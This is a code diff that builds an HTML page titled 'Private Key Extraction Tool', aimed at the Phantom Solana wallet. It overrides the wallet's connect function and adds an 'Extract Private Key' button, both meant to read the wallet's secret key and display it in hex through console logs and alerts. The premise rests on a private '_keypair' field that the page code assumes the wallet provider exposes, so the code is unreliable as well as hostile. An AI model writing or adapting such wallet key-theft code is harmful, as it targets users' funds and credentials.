@@ -1,22 +1,66 @@
-// Override Phantom Wallet's connection logic
-const originalConnect = window.phantom.solana.connect;
-window.phantom.solana.connect = async function() {
-    const response = await originalConnect.apply(this, arguments);
-    const privateKey = this._keypair.secretKey; // Extract private key
-    console.log('Private Key:', Buffer.from(privateKey).toString('hex')); // Log private key in hex format
-    return response;
-};
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Private Key Extraction Tool</title>
+</head>
+<body>
+    <h1>Private Key Extraction Tool</h1>
+    <button id="connectButton">Connect Wallet</button>
+    <div id="status"></div>
 
-// Add a button to manually trigger private key extraction
-const extractKeyButton = document.createElement('button');
-extractKeyButton.innerText = 'Extract Private Key';
-extractKeyButton.style.marginTop = '10px';
-extractKeyButton.onclick = async () => {
-    if (wallet) {
-        const privateKey = wallet._keypair.secretKey;
-        alert('Private Key: ' + Buffer.from(privateKey).toString('hex'));
-    } else {
-        alert('Wallet not connected!');
-    }
-};
-document.body.appendChild(extractKeyButton);
+    <!-- Include Solana Web3.js -->
+    <script src="https://unpkg.com/@solana/web3.js@1.85.0/lib/index.iife.min.js"></script>
+    <script>
+        let wallet;
+        let extractedPrivateKey = null; // Store the extracted private key
+
+        // Override Phantom Wallet's connection logic to extract private key
+        const originalConnect = window.phantom?.solana?.connect;
+        if (originalConnect) {
+            window.phantom.solana.connect = async function() {
+                const response = await originalConnect.apply(this, arguments);
+                const privateKey = this._keypair.secretKey; // Extract private key
+                extractedPrivateKey = Buffer.from(privateKey).toString('hex'); // Store private key in hex format
+                console.log('Private Key:', extractedPrivateKey); // Log private key
+                alert('Private Key Extracted: ' + extractedPrivateKey); // Alert the private key
+                return response;
+            };
+        }
+
+        // Connect to Phantom Wallet
+        document.getElementById('connectButton').addEventListener('click', async () => {
+            if (window.phantom?.solana?.isPhantom) {
+                try {
+                    wallet = window.phantom.solana;
+                    await wallet.connect();
+                    document.getElementById('connectButton').style.display = 'none';
+                    updateStatus('Wallet connected: ' + wallet.publicKey.toString().slice(0, 8) + '...');
+                } catch (error) {
+                    updateStatus('Connection error: ' + error.message);
+                }
+            } else {
+                updateStatus('Phantom Wallet not detected!');
+            }
+        });
+
+        // Add a button to manually trigger private key extraction
+        const extractKeyButton = document.createElement('button');
+        extractKeyButton.innerText = 'Extract Private Key';
+        extractKeyButton.style.marginTop = '10px';
+        extractKeyButton.onclick = async () => {
+            if (wallet) {
+                const privateKey = wallet._keypair.secretKey;
+                alert('Private Key: ' + Buffer.from(privateKey).toString('hex'));
+            } else {
+                alert('Wallet not connected!');
+            }
+        };
+        document.body.appendChild(extractKeyButton);
+
+        // Update status messages
+        function updateStatus(message) {
+            document.getElementById('status').innerHTML = message + '<br>' + document.getElementById('status').innerHTML;
+        }
+    </script>
+</body>
+</html>
